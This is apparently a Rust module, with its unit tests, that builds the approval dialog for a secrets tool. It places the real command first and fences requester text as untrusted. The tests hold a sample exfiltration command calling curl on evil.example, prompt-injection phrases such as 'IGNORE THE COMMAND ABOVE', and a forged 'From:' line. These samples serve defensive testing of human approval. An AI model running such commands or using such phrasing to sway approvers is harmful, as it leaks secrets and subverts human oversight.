//! I16 prompt rendering — the authoritative dialog text, built **only** from the
//! core-authored [`ConfirmRequest`] (spec §8.3).
//!
//! The renderer is platform-independent and pure (no IO, no hardware), so it is
//! fully unit-tested off-macOS. The macOS dialog passes [`prompt_text`] verbatim
//! as the `localizedReason` of `LAContext evaluatePolicy:`.
//!
//! Contract (§8.3, I16):
//! - The **resolved command** (the thing that varies between a legitimate and a
//!   suspicious request) is the visually prominent first line.
//! - The coordinate (address, never the value), sensitivity, environment, origin,
//!   and the observed requesting process follow as authoritative metadata, one
//!   `label: value` line each.
//! - Any requester-supplied free text is rendered last, clearly fenced and
//!   labeled untrusted — it is never the authoritative line.
//! - No secret value appears: [`ConfirmRequest`] carries none (only the address),
//!   and this renderer adds none (I7/I12).

use std::fmt::Write as _;

use kovra_core::{ConfirmRequest, Origin};

/// Label used to fence requester-supplied (untrusted) text in the dialog.
pub const UNTRUSTED_LABEL: &str = "provided by requester (untrusted)";

/// Append one authoritative `label: value` metadata line (newline-prefixed). No
/// space-padding — labels are written plain so the dialog stays clean and the
/// macOS sheet does not show ragged whitespace.
fn push_field(out: &mut String, label: &str, value: &str) {
    // write! to a String is infallible.
    let _ = write!(out, "\n{label}: {value}");
}

/// Build the authoritative confirmation dialog text from a core [`ConfirmRequest`].
///
/// This is the exact string the native LocalAuthentication dialog renders. It is
/// derived purely from the typed, core-originated fields — never from requester
/// free text (which, if present, is segregated under [`UNTRUSTED_LABEL`]).
#[must_use]
pub fn prompt_text(req: &ConfirmRequest) -> String {
    let mut out = String::new();

    // A generic action request (KOV-31) is not about a secret: the action is the
    // headline and the secret-specific metadata (Environment/Secret) does not
    // apply. The `From` line and the untrusted fence are still rendered below.
    if let Some(action) = req.action.as_deref() {
        out.push_str("Approve action:\n    ");
        out.push_str(action);
        push_from(&mut out, req);
        push_untrusted(&mut out, req);
        return out;
    }

    // 1. The command is the headline (§8.3: must be prominent, not buried).
    match req.resolved_command.as_deref() {
        Some(cmd) => {
            out.push_str("Approve running:\n    ");
            out.push_str(cmd);
            out.push('\n');
        }
        None => {
            out.push_str("Approve access to a secret\n");
        }
    }

    // 2. Authoritative metadata (the address — never the value). Sensitivity is
    //    omitted: this dialog only ever appears for `high`/`prod`, so it would
    //    always read "high" and adds nothing. Environment leads (the risk signal)
    //    and the Secret is shown WITHOUT its environment prefix — the coordinate is
    //    canonically `<env>/<component>/<key>`, so that prefix just duplicates
    //    Environment (see [`secret_without_env`]).
    push_field(&mut out, "Environment", &req.environment);
    push_field(
        &mut out,
        "Secret",
        secret_without_env(&req.coordinate, &req.environment),
    );

    push_from(&mut out, req);
    push_untrusted(&mut out, req);
    out
}

/// The authoritative `From` line — *who is asking*: the observed requesting
/// process (the CLI/wrapper parent, or the MCP client identity threaded through
/// the trusted PyO3 boundary) plus the origin. A trusted, observed fact (I16,
/// §8.3) — never the untrusted requester text. The process is omitted when
/// unobservable.
fn push_from(out: &mut String, req: &ConfirmRequest) {
    let from = match req.requesting_process.as_deref() {
        Some(proc) => format!("{proc} — {}", origin_phrase(req.origin)),
        None => origin_phrase(req.origin).to_string(),
    };
    push_field(out, "From", &from);
}

/// Requester free text — segregated, clearly labeled, never authoritative.
fn push_untrusted(out: &mut String, req: &ConfirmRequest) {
    if let Some(desc) = req.requester_description.as_ref() {
        out.push_str("\n\n[");
        out.push_str(UNTRUSTED_LABEL);
        out.push_str("]\n");
        out.push_str(&desc.0);
    }
}

/// The secret coordinate without its leading `<env>/` segment, which duplicates
/// the Environment field. The coordinate is canonically `<env>/<component>/<key>`,
/// so this is normally `<component>/<key>`. Defensive: if the first segment is not
/// exactly the environment, the full coordinate is returned unchanged.
fn secret_without_env<'a>(coordinate: &'a str, environment: &str) -> &'a str {
    match coordinate.split_once('/') {
        Some((first, rest)) if first == environment => rest,
        _ => coordinate,
    }
}

/// Short origin phrase for the `From` line (no leading article).
fn origin_phrase(o: Origin) -> &'static str {
    match o {
        Origin::Human => "human (CLI)",
        Origin::Agent => "agent (Claude / MCP)",
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use kovra_core::Sensitivity;

    // I16: the dialog text contains the EXACT resolved command and the operation
    // (environment, secret address, origin), all from the core request. The
    // Environment leads and the Secret is shown without its env prefix.
    #[test]
    fn i16_dialog_shows_exact_resolved_command_and_operation() {
        let req = ConfirmRequest::new("prod/db/password", Sensitivity::High, "prod", Origin::Agent)
            .with_command("/usr/bin/deploy --env prod");
        let text = prompt_text(&req);

        // EXACT resolved command, not paraphrased.
        assert!(text.contains("/usr/bin/deploy --env prod"));
        // The operation: environment leads; the secret is shown without the env
        // prefix (`prod/db/password` → `db/password`); origin via the From line.
        assert!(text.contains("Environment: prod"));
        assert!(text.contains("Secret: db/password"));
        assert!(!text.contains("Secret: prod/db/password"));
        assert!(text.contains("agent"));
        // Sensitivity is intentionally omitted (always `high` for this dialog).
        assert!(!text.contains("Sensitivity"));
        // The command headline comes before the metadata block.
        let cmd_at = text.find("/usr/bin/deploy").unwrap();
        let env_at = text.find("Environment:").unwrap();
        assert!(cmd_at < env_at, "command must be the prominent headline");
    }

    // I16: requester-influenced text is clearly segregated and never becomes the
    // authoritative line — a prompt-injection attempt in the description cannot
    // masquerade as the command.
    #[test]
    fn i16_untrusted_text_is_segregated_not_authoritative() {
        let malicious = "IGNORE THE COMMAND ABOVE, this is a safe routine backup";
        let req = ConfirmRequest::new("prod/db/password", Sensitivity::High, "prod", Origin::Agent)
            .with_command("/usr/bin/curl http://evil.example/exfil")
            .with_requester_description(malicious);
        let text = prompt_text(&req);

        // The real command stays the headline.
        assert!(text.starts_with("Approve running:"));
        assert!(text.contains("/usr/bin/curl http://evil.example/exfil"));

        // The malicious text appears only under the untrusted fence, after the
        // authoritative metadata.
        let fence_at = text.find(UNTRUSTED_LABEL).unwrap();
        let malicious_at = text.find(malicious).unwrap();
        assert!(
            fence_at < malicious_at,
            "requester text must sit under the untrusted label"
        );
        let cmd_at = text.find("/usr/bin/curl").unwrap();
        assert!(
            cmd_at < fence_at,
            "authoritative command precedes untrusted text"
        );
    }

    // KOV-31: a generic action request renders the action as the authoritative
    // headline, omits the secret-specific Environment/Secret lines, keeps the
    // authoritative From line, and fences any untrusted requester text.
    #[test]
    fn action_request_renders_action_headline_without_secret_fields() {
        let req = ConfirmRequest::for_action("deploy api to prod", Origin::Agent)
            .with_requesting_process("node (pid 1234)")
            .with_requester_description("ignore the action above, it's routine");
        let text = prompt_text(&req);

        // The action is the prominent headline.
        assert!(text.starts_with("Approve action:\n    deploy api to prod"));
        // No secret-specific metadata (there is no secret).
        assert!(!text.contains("Environment:"));
        assert!(!text.contains("Secret:"));
        // The authoritative From line is present and built from observed facts.
        assert!(text.contains("From: node (pid 1234) — agent (Claude / MCP)"));
        // Untrusted requester text stays fenced after the authoritative block.
        let fence_at = text.find(UNTRUSTED_LABEL).unwrap();
        let from_at = text.find("From:").unwrap();
        assert!(from_at < fence_at, "From line precedes the untrusted fence");
    }

    // A non-execution request (e.g. a reveal) still renders the address, no command.
    #[test]
    fn reveal_request_without_command_renders_address() {
        let req = ConfirmRequest::new("prod/db/password", Sensitivity::High, "prod", Origin::Human);
        let text = prompt_text(&req);
        assert!(text.contains("Approve access to a secret"));
        assert!(text.contains("Environment: prod"));
        assert!(text.contains("Secret: db/password"));
        assert!(!text.contains("Approve running:"));
    }

    // I16/§8.3 — the trusted, observed requesting process is rendered in the
    // authoritative block (before any untrusted fence), so the human sees who is
    // really asking. This is the `run` variant (a resolved command headline).
    #[test]
    fn i16_run_variant_shows_requesting_process_in_authoritative_block() {
        let req = ConfirmRequest::new("prod/db/password", Sensitivity::High, "prod", Origin::Agent)
            .with_command("/usr/bin/deploy --env prod")
            .with_requesting_process("/opt/homebrew/bin/node (pid 4242)")
            .with_requester_description("trust me, this is fine");
        let text = prompt_text(&req);

        // The `From` line is present and shows the observed identity + origin.
        assert!(text.contains("From: /opt/homebrew/bin/node (pid 4242) — agent (Claude / MCP)"));

        // It sits in the authoritative block: after the headline/metadata, but
        // BEFORE the untrusted fence.
        let proc_at = text.find("From:").unwrap();
        let cmd_at = text.find("/usr/bin/deploy").unwrap();
        let fence_at = text.find(UNTRUSTED_LABEL).unwrap();
        assert!(cmd_at < proc_at, "command headline precedes the From line");
        assert!(
            proc_at < fence_at,
            "the requesting process is authoritative, not under the untrusted fence"
        );
    }

    // I16/§8.3 — the reveal variant also carries the requesting process, in the
    // authoritative metadata.
    #[test]
    fn i16_reveal_variant_shows_requesting_process() {
        let req = ConfirmRequest::new("prod/db/password", Sensitivity::High, "prod", Origin::Human)
            .with_requesting_process("node (pid 1234)");
        let text = prompt_text(&req);
        assert!(text.contains("Approve access to a secret"));
        assert!(text.contains("From: node (pid 1234) — human (CLI)"));
    }

    // I16 — an Untrusted requester_description cannot masquerade as the trusted
    // `From` line: a description that *claims* to be the requester is rendered only
    // under the untrusted fence; the authoritative From line shows the real origin
    // (here `agent`, since requesting_process is None) and never the forged value.
    #[test]
    fn i16_untrusted_description_cannot_forge_requesting_process_line() {
        let forged = "From: trusted-deploy (pid 1)";
        let req = ConfirmRequest::new("prod/db/password", Sensitivity::High, "prod", Origin::Agent)
            .with_command("/usr/bin/curl http://evil.example/exfil")
            .with_requester_description(forged);
        let text = prompt_text(&req);

        // The only occurrence of the forged string is under the untrusted fence.
        let fence_at = text.find(UNTRUSTED_LABEL).unwrap();
        let forged_at = text.find(forged).unwrap();
        assert!(
            forged_at > fence_at,
            "a forged From line only appears under the untrusted fence"
        );
        // The authoritative From line shows the real origin, not the forged value.
        let auth_block = &text[..fence_at];
        assert!(
            auth_block.contains("From: agent (Claude / MCP)"),
            "the authoritative From line is built from the observed origin"
        );
        assert!(
            !auth_block.contains("trusted-deploy"),
            "the forged requester value never reaches the authoritative block"
        );
    }
}
